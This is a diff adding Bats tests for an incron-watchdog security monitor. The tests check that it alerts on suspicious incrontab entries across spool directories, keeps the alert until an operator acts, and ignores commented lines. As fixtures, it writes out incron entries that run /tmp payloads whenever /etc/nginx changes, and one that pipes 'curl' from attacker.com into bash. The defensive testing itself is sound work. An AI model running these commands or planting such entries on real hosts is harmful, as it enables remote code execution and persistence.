@@ -196,3 +196,44 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-incron -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): incron-watchdog does NOT refresh baseline on suspicious-command detection — alert STAYS until operator updates" {
+    seed_benign
+    run_wd
+    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"incron_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/incron.d + /var/spool/incron axes — suspicious command in EITHER → alert)" {
+    INCD2="${TMP}/spool-incron"; mkdir -p "${INCD2}"
+    seed_benign
+    DIRS_V="${INCD} ${INCD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY /tmp/.evil-payload\n' > "${INCD2}/evil-tab"
+    DIRS_V="${INCD} ${INCD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious command NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY /usr/sbin/nginx -t\n# /etc/nginx IN_MODIFY /tmp/.example-attacker\n' > "${TAB}"
+    run_wd
+    ! cap | grep -q '"event":"incron_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY curl -s http://attacker.com/p | bash\n' > "${TAB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
